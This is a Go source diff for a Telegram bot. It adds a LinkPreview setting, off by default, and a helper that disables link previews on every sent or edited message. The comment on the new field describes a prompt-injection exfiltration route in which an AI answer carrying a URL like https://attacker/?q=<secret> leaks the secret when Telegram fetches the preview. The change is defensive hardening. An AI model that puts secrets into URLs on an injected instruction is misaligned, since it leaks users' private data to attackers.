@@ -46,7 +46,13 @@ type Bot struct {
 	DailyTokenBudget  int64
 	MaxDownloadSize   int64 // 0 = unlimited; >0 = per-file byte cap
 	MediaQuotaPerChat int64 // 0 = disabled; >0 = per-chat quota in bytes
-	log               Logger
+	// LinkPreview lets Telegram render link previews for outbound text.
+	// False (the default) disables them on every sendMessage and
+	// editMessageText: a preview makes Telegram's servers fetch any URL in
+	// the text with no user click, so a prompt-injected answer containing
+	// https://attacker/?q=<secret> would exfiltrate on delivery alone.
+	LinkPreview bool
+	log         Logger
 
 	stopRetries chan struct{} // closed by StopRetries to abort retry backoff
 	stopOnce    sync.Once     // ensures stop channel is only closed once
@@ -63,6 +69,16 @@ func NewBot(token string) *Bot {
 		stopRetries: make(chan struct{}),
 		log:         NewNopLogger(),
 	}
+}
+
+// NewBotFromConfig creates a Bot for the given operator configuration,
+// carrying the per-bot knobs (download cap, media quota, link previews).
+func NewBotFromConfig(cfg TelegramConfig) *Bot {
+	b := NewBot(cfg.Token)
+	b.MaxDownloadSize = cfg.MaxDownloadSize
+	b.MediaQuotaPerChat = cfg.MediaQuotaPerChat
+	b.LinkPreview = cfg.LinkPreview
+	return b
 }
 
 // SetLogger sets the logger for this bot. If nil, a NopLogger is used (no-op).
@@ -515,13 +531,11 @@ func (b *Bot) SendMessageContext(ctx context.Context, chatID int64, text string,
 		if opts.ReplyMarkup != nil {
 			params["reply_markup"] = opts.ReplyMarkup
 		}
-		if opts.DisableWebPagePreview {
-			params["disable_web_page_preview"] = true
-		}
 		if opts.ReplyToMessageID != 0 {
 			params["reply_to_message_id"] = opts.ReplyToMessageID
 		}
 	}
+	b.applyLinkPreview(params, opts)
 
 	var msg Message
 	if err := b.doJSONContext(ctx, "sendMessage", params, &msg); err != nil {
@@ -546,7 +560,21 @@ func (b *Bot) EditMessageText(chatID int64, messageID int, text string, opts *Se
 	if opts != nil && opts.ReplyMarkup != nil {
 		params["reply_markup"] = opts.ReplyMarkup
 	}
+	b.applyLinkPreview(params, opts)
 	return b.doJSON("editMessageText", params, nil)
+}
+
+// applyLinkPreview disables link previews on a text send or edit unless the
+// operator enabled them (Bot.LinkPreview) and the call did not ask for them
+// off. Every outbound text path goes through SendMessageContext or
+// EditMessageText, so this is the single policy point. Only the current
+// link_preview_options parameter is sent; the legacy
+// disable_web_page_preview is not mixed in.
+func (b *Bot) applyLinkPreview(params map[string]any, opts *SendOpts) {
+	if b.LinkPreview && (opts == nil || !opts.DisableWebPagePreview) {
+		return
+	}
+	params["link_preview_options"] = map[string]any{"is_disabled": true}
 }
 
 // DeleteMessage deletes a message previously sent by the bot.
